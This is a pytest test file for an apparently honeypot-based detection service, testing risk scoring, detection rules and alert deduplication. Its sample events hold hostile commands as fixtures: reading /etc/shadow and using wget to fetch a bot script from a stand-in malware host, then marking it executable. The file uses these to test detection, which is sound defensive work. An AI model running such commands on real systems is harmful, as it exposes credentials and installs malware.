import datetime
import pytest
from app.services.detection_engine import detection_engine
from app.services.risk_scoring import risk_scoring_service
from app.services.incident_correlator import incident_correlator
from app.ingestion.base import NormalizedEvent
from app.models import DetectionRule, HoneypotEvent, Alert, Investigation
from conftest import TestingSessionLocal

def test_risk_scoring_bounds_and_explainability():
    # Test high risk scenario
    risk = risk_scoring_service.calculate_risk(
        severity="critical",
        threat_intel_score=95.0,
        event_count=12,
        is_anomalous=True,
        anomaly_score=-0.35,
        asset_tier="Payment Gateway",
        confidence=0.95
    )
    assert 0.0 <= risk["risk_score"] <= 100.0
    assert risk["priority"] == "CRITICAL"
    assert len(risk["factors"]) == 5
    assert "summary" in risk

    # Test low risk scenario
    low_risk = risk_scoring_service.calculate_risk(
        severity="low",
        threat_intel_score=10.0,
        event_count=1,
        is_anomalous=False,
        asset_tier="Internal Telemetry",
        confidence=0.85
    )
    assert low_risk["risk_score"] < 40.0
    assert low_risk["priority"] == "LOW"

def test_detection_engine_privileged_activity():
    db = TestingSessionLocal()
    try:
        ev = NormalizedEvent(
            event_id="cowrie.command.input",
            timestamp=datetime.datetime.utcnow(),
            src_ip="194.26.29.112",
            username="root",
            command="cat /etc/shadow",
            session_id="test-session-1"
        )
        findings = detection_engine.evaluate_event(ev, db=db)
        assert len(findings) > 0
        p_finding = next((f for f in findings if "Privileged" in f.rule_name), None)
        assert p_finding is not None
        assert p_finding.severity == "critical"
        assert len(p_finding.recommended_actions) > 0
    finally:
        db.close()

def test_incident_correlation_and_alert_deduplication():
    db = TestingSessionLocal()
    try:
        ev = NormalizedEvent(
            event_id="cowrie.command.input",
            timestamp=datetime.datetime.utcnow(),
            src_ip="198.51.100.44",
            username="root",
            command="wget http://malware.org/bot.sh; chmod +x bot.sh",
            session_id="corr-session-1"
        )

        findings = detection_engine.evaluate_event(ev, db=db)
        assert len(findings) > 0

        # First correlation creates alert and investigation
        alert1 = incident_correlator.correlate_and_process(
            event_id=999901,
            event_dict=ev.to_dict(),
            findings=findings,
            db=db
        )
        assert alert1 is not None
        assert alert1.src_ip == "198.51.100.44"
        assert alert1.incident_id is not None
        assert alert1.risk_score > 0

        # Second correlation within dedup window updates existing alert rather than duplicating
        alert2 = incident_correlator.correlate_and_process(
            event_id=999902,
            event_dict=ev.to_dict(),
            findings=findings,
            db=db
        )
        assert alert2 is not None
        assert alert2.id == alert1.id # Deduplicated!
    finally:
        db.close()
